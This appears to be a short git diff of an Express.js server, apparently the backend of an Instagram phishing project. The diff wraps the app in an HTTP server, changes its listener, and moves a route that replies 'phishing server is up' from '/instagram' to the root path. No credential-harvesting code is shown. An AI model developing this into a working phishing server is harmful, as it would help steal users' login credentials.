@@ -2,8 +2,10 @@ import mongoose from "mongoose";
 import cors from 'cors'
 import express from 'express'
 import dotenv from 'dotenv'
+import {createServer} from 'http'
 dotenv.config({path:'./.env'})
 const app=express()
+const server = createServer(app)
 app.use(express.urlencoded({extended:true}))
 app.use(express.json())
 const options={
@@ -28,14 +30,14 @@ const database=async(req,res)=>{
 }
 database()
 .then(listen=>{
-    app.listen(300,()=>{
+    server.listen(300,()=>{
         console.log(300);
     })
 })
 .catch(err=>{
     console.log(err);
 })
-app.get('/instagram',(req,res)=>{
+app.get('/',(req,res)=>{
 res.send('phishing server is up')
 })
 
